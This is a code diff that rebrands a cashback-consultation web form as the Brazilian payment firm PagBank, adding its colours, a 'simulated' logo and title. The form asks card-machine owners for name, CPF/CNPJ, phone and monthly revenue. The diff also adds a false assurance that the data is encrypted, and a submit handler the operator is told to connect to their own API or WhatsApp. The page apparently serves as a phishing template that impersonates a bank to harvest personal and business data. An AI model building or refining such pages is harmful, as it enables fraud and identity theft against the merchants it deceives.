@@ -3,16 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Consulte seu Cashback — Análise de Linha de Crédito</title>
+    <title>Consulte seu Cashback — PagBank</title>
     <style>
+        /* CONFIGURAÇÃO DE CORES OFICIAIS/CORPORATIVAS */
         :root {
-            --primary: #0f172a;
-            --accent: #059669;
-            --accent-hover: #047857;
-            --slate-100: #f1f5f9;
+            --pagbank-green: #00b15e;       /* Verde oficial PagBank */
+            --pagbank-dark: #1a202c;        /* Grafite escuro profissional */
+            --pagbank-hover: #00964f;       /* Tom de foco/hover */
+            --bg-gradient-1: #f4fbf7;       /* Fundo suave esverdeado */
+            --bg-gradient-2: #eaf7f1;
             --slate-300: #cbd5e1;
             --slate-600: #475569;
-            --slate-800: #1e293b;
         }
 
         * { 
@@ -23,7 +24,7 @@
         }
 
         body { 
-            background: radial-gradient(circle at top, #f8fafc 0%, #e2e8f0 100%); 
+            background: linear-gradient(135deg, var(--bg-gradient-1) 0%, var(--bg-gradient-2) 100%); 
             display: flex; 
             justify-content: center; 
             align-items: center; 
@@ -35,10 +36,10 @@
             background: #ffffff; 
             padding: 40px 32px; 
             border-radius: 20px; 
-            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.05), 0 10px 10px -5px rgba(0, 0, 0, 0.02); 
+            box-shadow: 0 20px 25px -5px rgba(0, 177, 94, 0.05), 0 10px 10px -5px rgba(0, 0, 0, 0.02); 
             max-width: 480px; 
             width: 100%; 
-            border: 1px solid rgba(0, 0, 0, 0.03);
+            border: 1px solid rgba(0, 177, 94, 0.1);
         }
 
         .header {
@@ -46,10 +47,21 @@
             margin-bottom: 32px;
         }
 
+        /* Logotipo Simulado */
+        .logo {
+            font-size: 24px;
+            font-weight: 800;
+            color: var(--pagbank-dark);
+            margin-bottom: 16px;
+        }
+        .logo span {
+            color: var(--pagbank-green);
+        }
+
         h2 { 
-            color: var(--primary); 
-            margin-bottom: 8px; 
-            font-size: 26px; 
+            color: var(--pagbank-dark); 
+            margin-bottom: 10px; 
+            font-size: 24px; 
             font-weight: 700;
             letter-spacing: -0.02em;
         }
@@ -67,7 +79,7 @@
         label { 
             display: block; 
             margin-bottom: 8px; 
-            color: var(--slate-800); 
+            color: var(--pagbank-dark); 
             font-weight: 600; 
             font-size: 13px; 
             text-transform: uppercase;
@@ -80,7 +92,7 @@
             border: 1px solid var(--slate-300); 
             border-radius: 10px; 
             font-size: 15px; 
-            color: var(--primary);
+            color: var(--pagbank-dark);
             background-color: #fbfbfb;
             transition: all 0.2s ease-in-out; 
         }
@@ -91,30 +103,31 @@
 
         input:focus { 
             outline: none; 
-            border-color: var(--accent); 
+            border-color: var(--pagbank-green); 
             background-color: #ffffff;
-            box-shadow: 0 0 0 4px rgba(5, 150, 105, 0.15); 
+            box-shadow: 0 0 0 4px rgba(0, 177, 94, 0.15); 
         }
 
+        /* BOTÃO ENVIAR PARA ANÁLISE */
         button { 
             width: 100%; 
-            background: var(--accent); 
+            background: var(--pagbank-green); 
             color: white; 
             border: none; 
             padding: 16px; 
             border-radius: 10px; 
             font-size: 16px; 
-            font-weight: 600; 
+            font-weight: 700; 
             cursor: pointer; 
             transition: all 0.2s ease; 
             margin-top: 12px; 
-            box-shadow: 0 4px 6px -1px rgba(5, 150, 105, 0.2);
+            box-shadow: 0 4px 6px -1px rgba(0, 177, 94, 0.2);
         }
 
         button:hover { 
-            background: var(--accent-hover); 
+            background: var(--pagbank-hover); 
             transform: translateY(-1px);
-            box-shadow: 0 10px 15px -3px rgba(5, 150, 105, 0.3);
+            box-shadow: 0 10px 15px -3px rgba(0, 177, 94, 0.3);
         }
 
         button:active {
@@ -144,8 +157,9 @@
 
 <div class="container">
     <div class="header">
+        <div class="logo">Pag<span>Bank</span></div>
         <h2>Consulte seu Cashback</h2>
-        <p>Insira os dados da empresa ou titular para realizarmos a análise cadastral da sua máquina e calcular o teto de resgate.</p>
+        <p>Insira os dados solicitados abaixo para realizarmos a consulta cadastral da sua máquina e calcular o teto de resgate disponível.</p>
     </div>
     
     <form id="cashbackForm">
@@ -156,4 +170,92 @@
         
         <div class="form-group">
             <label for="documento">CPF ou CNPJ</label>
-            <input type="text" id="documento" placeholder="000.000.000-00 ou 00.00
+            <input type="text" id="documento" placeholder="000.000.000-00 ou 00.000.000/0001-00" maxlength="18" required>
+        </div>
+        
+        <div class="form-group">
+            <label for="telefone">Telefone / WhatsApp</label>
+            <input type="tel" id="telefone" placeholder="(00) 90000-0000" maxlength="15" required>
+        </div>
+        
+        <div class="form-group">
+            <label for="renda">Faturamento Mensal da Máquina</label>
+            <input type="text" id="renda" placeholder="R$ 0,00" required>
+        </div>
+        
+        <button type="submit" id="btnSubmit">Enviar para Análise</button>
+    </form>
+    
+    <div class="footer">
+        <span>🔒</span> Seus dados estão criptografados e protegidos de acordo com as normas de segurança.
+    </div>
+</div>
+
+<script>
+    /* MÁSCARAS AUTOMÁTICAS (OPCIONAL/EDITÁVEL) */
+    
+    // Máscara dinâmica para CPF ou CNPJ
+    document.getElementById('documento').addEventListener('input', function (e) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length <= 11) {
+            value = value.replace(/(\d{3})(\d)/, '$1.$2');
+            value = value.replace(/(\d{3})(\d)/, '$1.$2');
+            value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+        } else {
+            value = value.replace(/^(\d{2})(\d)/, '$1.$2');
+            value = value.replace(/^(\d{2})\.(\d{3})(\d)/, '$1.$2.$3');
+            value = value.replace(/\.(\d{3})(\d)/, '.$1/$2');
+            value = value.replace(/(\d{4})(\d{1,2})$/, '$1-$2');
+        }
+        e.target.value = value;
+    });
+
+    // Máscara para Celular/Telefone
+    document.getElementById('telefone').addEventListener('input', function (e) {
+        let value = e.target.value.replace(/\D/g, '');
+        value = value.replace(/^(\d{2})(\d)/g, '($1) $2');
+        value = value.replace(/(\d)(\d{4})$/, '$1-$2');
+        e.target.value = value;
+    });
+
+    // Máscara para valores em R$
+    document.getElementById('renda').addEventListener('input', function (e) {
+        let value = e.target.value.replace(/\D/g, '');
+        value = (value / 100).toFixed(2) + '';
+        value = value.replace(".", ",");
+        value = value.replace(/(\d)(?=(\d{3})+(?!\d))/g, "$1.");
+        e.target.value = value ? 'R$ ' + value : '';
+    });
+
+    /* EVENTO DE ENVIO DO FORMULÁRIO */
+    document.getElementById('cashbackForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const btn = document.getElementById('btnSubmit');
+        btn.disabled = true;
+        btn.innerText = 'Processando dados...';
+
+        // Captura das variáveis para você integrar com sua API ou WhatsApp
+        const dadosFormulario = {
+            nome: document.getElementById('nome').value,
+            documento: document.getElementById('documento').value,
+            telefone: document.getElementById('telefone').value,
+            faturamento: document.getElementById('renda').value
+        };
+
+        // Exemplo de comportamento após envio (Edite esta parte com sua lógica)
+        setTimeout(() => {
+            alert('Dados enviados com sucesso! Sua análise está sendo processada.');
+            
+            // Restaura o botão
+            btn.disabled = false;
+            btn.innerText = 'Enviar para Análise';
+            
+            // Limpa o formulário se desejar
+            document.getElementById('cashbackForm').reset();
+        }, 1500);
+    });
+</script>
+
+</body>
+</html>
